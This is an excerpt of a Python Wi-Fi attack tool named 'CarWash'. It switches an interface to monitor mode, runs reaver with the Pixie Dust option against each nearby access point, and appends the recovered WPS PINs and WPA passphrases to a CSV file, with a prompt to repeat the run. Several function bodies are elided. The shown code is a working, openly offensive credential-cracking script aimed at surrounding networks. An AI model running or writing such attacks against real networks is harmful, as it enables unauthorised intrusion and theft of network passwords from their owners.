...
def print_carwash_ascii():
 ...
 ;__\|___________|++++++++++++++++++|___________|/__;
  (~~====___________________________________====~~~)
   \------____________[ Hosaka ]___________-------/
      |      ||        ~~~~~~~~        ||      |
       \_____/     by d3k4@t3ss3r4      \_____/  
        '''
    print(carwash_ascii)
    time.sleep(2)
...
def set_monitor_mode(interface):
    ...
    time.sleep(2)
    print("\n[x]:[Removing rfkill blockages.]", flush=True)
    time.sleep(1)
...
def run_reaver(ap_bssid, channel, suppress_header=True):
    cmd = ["reaver", "-i", "wlan1mon", "-b", ap_bssid, "-c", str(channel), "-F", "-N", "-K", "-vv"]
...
def save_to_file(ap_info):
    ...
    with open("traffic_ticket.csv", "a", newline="") as csvfile:
        ...
        if not existing_data:
            writer.writeheader()
        # Write the new access points to the file
        for ap in ap_info:
...
def restart_prompt(interface):
    while True:
        if not click.confirm('\n[?]:[rollCar and reWash?]\n', default=True):
            click.echo("\n[-]:[Thanks for using CarWash. Exiting...]\n")
            return
...
@click.command()
@click.option('--timeout', default=28, help='Timeout for a CarWashing attempt in seconds.')
@click.option('--interface', '-i', default=None, help='Monitor / Injection link for CarWashing.')
def carwash(timeout, interface):
    ...
    try:
        for ap in ap_list:
            ...
            wps_pin, wpa_psk = run_reaver(bssid, channel)
